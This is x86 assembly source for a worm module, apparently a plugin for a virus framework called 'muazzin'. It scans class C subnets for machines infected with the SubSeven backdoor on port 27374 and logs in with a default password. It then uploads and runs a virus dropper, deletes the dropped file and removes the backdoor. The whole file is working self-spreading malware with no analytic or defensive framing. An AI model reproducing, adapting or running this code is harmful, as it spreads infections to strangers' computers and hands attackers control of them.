;Scan IP subnets type C for sub7 servers, install virus, remove server

BITS 32

%include "\muazzin\muazzin.asi"
%include "\muazzin\samples\socket.inc"
%include "sub7.inc"

TYPE    EQU "sub7"
VERSION EQU 0101h              



entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_APP
       jnz init_system
       test dword [esi+m_why], MT_BLOCKIP
       jnz near activate_thread
       test dword [esi+m_why], MT_QUERY
       jnz .query
  .exit:
       mov dword [esi+m_result], MR_DONE
       ret 4
  .query:
       mov esi, MT_QUERY+MT_APP+MT_BLOCKIP
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4



rnd:
       pushad
       mov eax, 12345678h
  seed equ $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       call delta
       mov [ebp+seed], eax
       mov ecx, [esp+(8*4)+4]
       jecxz .nolimit
       cdq
       div ecx
       xchg eax, edx
  .nolimit:
       mov [esp+(7*4)], eax
       popad
       bt eax, 1
       ret 4



delta:
       call .delta
  .delta:
       pop ebp
       sub ebp, .delta
       ret



init_system:
       call dllinit
       pushad
       mov eax, [esi+m_dropper]
       mov [ebp+.dropper], eax
       mov eax, [esi+m_droppersize]
       mov [ebp+fsize2], eax
       cmp eax, 9999
       jbe near .exit
       cmp eax, 99999
       ja near .exit
       push byte 5
       push byte 10
       pop ebx
       pop ecx
  .div_loop:
       cdq
       div ebx
       push edx
       loop .div_loop
       push byte 5
       pop ecx
       lea esi, [ebp+fsize-1]
  .turn2ascii:
       inc esi
       pop eax
       add al, "0"
       mov byte [esi], al
       loop .turn2ascii
       push byte 8
       pop ecx
  .rnd_name:
       push byte 26
       call rnd
       add al, "A"
       mov [ebp+rtfn-1+ecx], al
       mov [ebp+fmxn-1+ecx], al
       mov [ebp+fmdn-1+ecx], al
       loop .rnd_name
       push byte 0
       push dword "list"
       push dword " IP "
       push dword "sub7"
       push esp
       push byte 0
       push dword FILE_MAP_ALL_ACCESS
       call [ebp+OpenFileMappingA]
       test eax, eax
       jnz .installed
       mov edx, esp
       mov ecx, 8*1024
       call create_map
       lea esp, [esp+4*4]
       jz .exit
       sub edi, edi
       xchg edi, eax
       rep stosb                        ;fill with 0ïs
       push byte 0
       push dword "nner"
       push dword " sca"
       push dword "sub7"
       push esp
       push byte 0
       push dword FILE_MAP_ALL_ACCESS
       call [ebp+OpenFileMappingA]
       test eax, eax
       jz .create
  .installed:
       add esp, 4*4                     ;is already installed
       push eax
       call [ebp+CloseHandle]
       jmp .exit
  .create:
       mov edx, esp
       mov ecx, 64*1024
       call create_map
       lea esp, [esp+4*4]
       jz .exit
       mov edi, eax
       mov esi, ebp
       mov ecx, my_size
       rep movsb                        ;copy code
       mov esi, 12345678h
  .dropper equ $-4
       mov ecx, dword [ebp+fsize2]
       rep movsb                        ;copy dropper code
  .exit
       popad
       jmp entry.exit



activate_thread:
       call dllinit
       pushad
       call CheckInet
       jc near .error
       push byte 0
       push dword "nner"
       push dword " sca"
       push dword "sub7"
       push esp
       push byte 0
       push dword FILE_MAP_ALL_ACCESS
       call [ebp+OpenFileMappingA]
       add esp, 4*4
       test eax, eax
       jz near .error
       push dword 64*1024
       push byte 0
       push byte 0
       push dword FILE_MAP_WRITE
       push eax
       mov [ebp+.handle], eax
       call [ebp+MapViewOfFile]
       test eax, eax
       jz near .error2
       mov edi, eax
       push byte 0
       push dword "list"
       push dword " IP "
       push dword "sub7"
       push esp
       push byte 0
       push dword FILE_MAP_ALL_ACCESS
       call [ebp+OpenFileMappingA]
       add esp, 4*4
       test eax, eax
       jz near .error1
       push dword 8*1024
       push byte 0
       push byte 0
       push dword FILE_MAP_WRITE
       push eax
       mov [ebp+.handle2], eax
       call [ebp+MapViewOfFile]
       test eax, eax
       jz near .error3
       mov esi, eax
       cmp byte [edi+sub7_thread_running], 5
       jae near .dontrun
       mov eax, [esp+(1*4)]
       mov ecx, [eax+m_port]
       cmp cl, 25                       ;smtp
       je .dontrun
       cmp cl, 80                       ;http
       je .dontrun
       cmp cl, 119                      ;nntp
       je .dontrun
       cmp cl, 110                      ;pop3
       je .dontrun
       mov edx, [eax+m_ip]
       and edx, 00ffffffh
       mov [ebp+ip2scan], edx
       mov ebx, esi
  .check_ip:
       lodsd
       test eax, eax
       jz .notfound
       sub eax, edx
       jz .dontrun
       jmp .check_ip
  .notfound:
       mov [esi-4], edx                 ;add to list
       sub esi, ebx
       cmp esi, 7*1024                  ;we are near limit of list?
       jbe .no_move_down
       mov edx, 8*1024
       lea ecx, [esi-2*1024]            ;delete first 2k of log
       sub edx, ecx
       mov edi, ebx
       lea esi, [edi+2*1024]
       rep movsb                        ;move list down
       sub eax, eax
       mov ecx, edx
       rep stosb                        ;fill with 0
  .no_move_down:
       mov esi, ebx
       push ecx
       push esp
       push byte 0
       push dword 12345678h             ;ip->parametro
  ip2scan equ $-4
       lea eax, [edi+sub7_thread]
       push eax                         ;thread start address
       push byte 0
       push byte 0
       call [ebp+CreateThread]
       pop eax
  .dontrun:
       push esi
       call [ebp+UnmapViewOfFile]
  .error3:
       push dword 12345678h
  .handle2 equ $-4
       call [ebp+CloseHandle]
  .error1:
       push edi
       call [ebp+UnmapViewOfFile]
  .error2:
       push dword 12345678h
  .handle equ $-4
       call [ebp+CloseHandle]
  .error:
       popad
       mov dword [esi+m_result], MR_OK
       ret 4



sub7_thread_running db 0



sub7_thread:
       pushad
       call delta
       inc byte [ebp+sub7_thread_running]
       mov edi, [esp+8*4+4]             ;IP
       sub esp, WSAdata_size
       push esp
       push dword 0101h
       call [ebp+WSAStartup]
       sub esp, -WSAdata_size
       sub ecx, ecx
  .sub7_scan:
       inc ecx
       push ecx
       push edi
       push ecx
       push byte IPPROTO_IP
       push byte SOCK_STREAM
       push byte AF_INET
       call [ebp+socket]
       mov ebx, eax
       inc eax
       pop ecx
       jz near .next_host1
       sub eax, eax
       push eax
       push eax
       push edi                         ;host
       mov byte [esp+3], cl
;int 3
;pushad
;mov eax, [esp+8*4]
;sub esp, 32
;mov ecx, 8
;mov edi, esp
;.tmp1:
;rol eax, 4
;push eax
;and eax, 0fh
;call .tmp2
;db "0123456789ABCDEF"
;.tmp2:
;pop ebx
;xlatb
;stosb
;pop eax
;loop .tmp1
;sub eax, eax
;stosd
;mov eax, esp
;push byte 0
;push eax
;push eax
;push byte 0
;mov eax, 0BFF5412Eh            ;msgboxa
;call eax
;add esp, 32
;popad
       push dword 0ee6a0002h             ;port 27374
       mov eax, esp
       push byte sockaddr_in_size
       push eax
       push ebx
       call [ebp+connect]
       sub esp, -(sockaddr_in_size)
       test eax, eax
       jnz near .next_host
       sub esp, 400h
       mov edi, esp
       sub esi, esi
  .check_reply:
       push dword 200h
       push edi
       call saferecv
       inc eax
       jz near .free_stack
       cmp dword [edi], "conn"
       je .connected
       test esi, esi
       jnz near .free_stack             ;second run...
       lea esi, [ebp+psw]
       push byte psw_size
       push esi
       call safesend                    ;try default psw
       jmp .check_reply
  .connected:
       lea esi, [ebp+rtf]
       push byte rtf_size
       push esi
       call safesend
       push dword 200h
       push edi
       call saferecv
       inc eax
       jz near .free_stack
       cmp word [edi], "TI"
       jne near .free_stack             ;upload accepted
       lea esi, [ebp+stf]
       push byte stf_size
       push esi
       call safesend                    ;send command
       sub edx, edx
       mov edi, 12345678h               ;edi==remainder
  fsize2 equ $-4
       lea esi, [ebp+dropper_buffer]    ;esi==current virus position
  .send_loop:
       mov eax, 1043
       cmp eax, edi                     ;we have less than 1043 to send?
       jbe .nahh
       mov eax, edi                     ;send the remainder
  .nahh:
       push eax
       push esi
       call safesend                    ;send dropper
       inc eax
       jz .free_stack3
       dec eax
       add esi, eax                     ;increase virus offset
       add edx, eax
       sub edi, eax
       jz .send_done                    ;all send?
       push byte 7
       cmp edx, 9999
       pop eax
       jbe .noinc
       inc eax                  ;number of digits to read
  .noinc:
       mov ecx, esp
       push eax
       push ecx
       call saferecv            ;p:1234?.
       inc eax
  .free_stack3:
       jz near .free_stack
       jmp .send_loop
  .send_done:
       mov edi, esp
       push dword 200h
       push edi
       call saferecv
       inc eax
       jz .free_stack
       cmp word [edi], "p:"
       jne .check_ok
       add edi, 8
  .check_ok:
       cmp dword [edi], "file"
       jne .free_stack
  .transfer_end:
       lea esi, [ebp+fmx]
       push byte fmx_size
       push esi
       call safesend
       push dword 200h
       push edi
       call saferecv                    ;run file
       inc eax
       jz .free_stack
       push dword 5*1000
       call [ebp+Sleep]
       lea esi, [ebp+fmd]
       push byte fmd_size
       push esi
       call safesend
       push dword 200h
       push edi
       call saferecv                    ;delete file
       inc eax
       jz .free_stack
       lea esi, [ebp+rms]
       push byte rms_size
       push esi
       call safesend
       push dword 200h
       push edi
       call saferecv                    ;remove server
  .free_stack:
       sub esp, -400h
  .next_host:
       push ebx
       call [ebp+closesocket]
  .next_host1:
       pop edi
       pop ecx
       cmp cl, -1
       jne near .sub7_scan
  .cleanup:
       call [ebp+WSACleanup]
       dec byte [ebp+sub7_thread_running]
       popad
       ret 4



safesend:
       pushad
  .again:
       push byte 0
       push dword [esp+(8*4)+8+4]
       push dword [esp+(8*4)+4+8]
       push ebx
       call [ebp+send]
       xchg eax, ecx
       jecxz .set_eax
       inc ecx
       jnz .no_error
       call [ebp+WSAGetLastError]
       sub eax, EWOULDBLOCK
       jz .again
       sub ecx, ecx
  .no_error:
       dec ecx
  .set_eax:
       mov [esp+7*4], ecx
       popad
       ret 8



saferecv:
       pushad
  .again:
       push byte 0
       push dword [esp+(8*4)+8+4]
       push dword [esp+(8*4)+4+8]
       push ebx
       call [ebp+recv]
       xchg eax, ecx
       jecxz .set_eax
       inc ecx
       jnz .no_error
       call [ebp+WSAGetLastError]
       sub eax, EWOULDBLOCK
       jz .again
       sub ecx, ecx
  .no_error:
       dec ecx
  .set_eax:
       mov [esp+7*4], ecx
       popad
       ret 8



dllinit:
       call delta
       pushad
       mov edi, [esi+GPA]
       mov [ebp+getpaddr], edi
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  .next_dll:
       lodsd
       test eax, eax
       jz .all_import
       push esi
       stc
       sbb ebx, ebx             ;ebx==-1
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz .dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       mov ebx, eax
  .dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  .skip_dllname:
       lodsb
       test al, al
       jnz .skip_dllname
  .next_import:
       lodsd
       test eax, eax
       jz .dll_done
       add eax, ebp
       push eax
       push ebx
       call edi
       mov [esi-4], eax
       jmp .next_import
  .dll_done:
       pop esi
       jmp .next_dll
  .all_import:
       call [ebp+GetTickCount]
       mov [ebp+seed], eax
       popad
       ret



create_map:
       pushad
       call delta
       sub esi, esi
       mov edi, ecx
       push edx
       push edi
       push esi
       push dword PAGE_READWRITE
       push esi
       push byte -1
       call [ebp+CreateFileMappingA]
       test eax, eax
       jz .exit
       push edi
       push esi
       push esi
       push dword FILE_MAP_ALL_ACCESS
       push eax
       call [ebp+MapViewOfFile]
       test eax, eax
  .exit:
       mov [esp+7*4], eax
       popad
       ret



%include "\muazzin\samples\inet.asi"



psw      db "PWD14438136782715101980"
psw_size equ $-psw

rtf      db "RTFC:\"
rtfn     db "12345678"
         db ".EXE"
rtf_size equ $-rtf

stf      db "STF05"
fsize    db "12345"
stf_size equ $-stf

fmx      db "FMXC:\"
fmxn     db "12345678"
         db ".EXE"
fmx_size equ $-fmx

fmd      db "FMDC:\"
fmdn     db "12345678"
         db ".EXE"
fmd_size equ $-fmd

rms      db "RMS"
rms_size equ $-rms



getpaddr dd 0
getmhnd  dd 0



import_table dd kernel32
             dd wsock32
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileMappingA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "GetTickCount",0
.apiname006 db "MapViewOfFile",0
.apiname007 db "UnmapViewOfFile",0
.apiname008 db "OpenFileMappingA",0
.apiname009 db "CreateThread",0
.apiname010 db "Sleep",0

LoadLibraryA     equ kernel32.api001
FreeLibrary      equ kernel32.api002
CreateFileMappingA equ kernel32.api003
CloseHandle      equ kernel32.api004
GetTickCount     equ kernel32.api005
MapViewOfFile    equ kernel32.api006
UnmapViewOfFile  equ kernel32.api007
OpenFileMappingA equ kernel32.api008
CreateThread     equ kernel32.api009
Sleep            equ kernel32.api010

wsock32     db "WS2_32.DLL",0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
            dd 0
.apiname001 db "connect", 0
.apiname002 db "closesocket", 0
.apiname003 db "recv", 0
.apiname004 db "send", 0
.apiname005 db "WSAGetLastError", 0
.apiname006 db "WSAStartup", 0
.apiname007 db "WSACleanup", 0
.apiname008 db "socket", 0

connect          equ wsock32.api001
closesocket      equ wsock32.api002
recv             equ wsock32.api003
send             equ wsock32.api004
WSAGetLastError  equ wsock32.api005
WSAStartup       equ wsock32.api006
WSACleanup       equ wsock32.api007
socket           equ wsock32.api008

LOADLIB equ LoadLibraryA
FREELIB equ FreeLibrary

my_size equ $-entry

dropper_buffer:
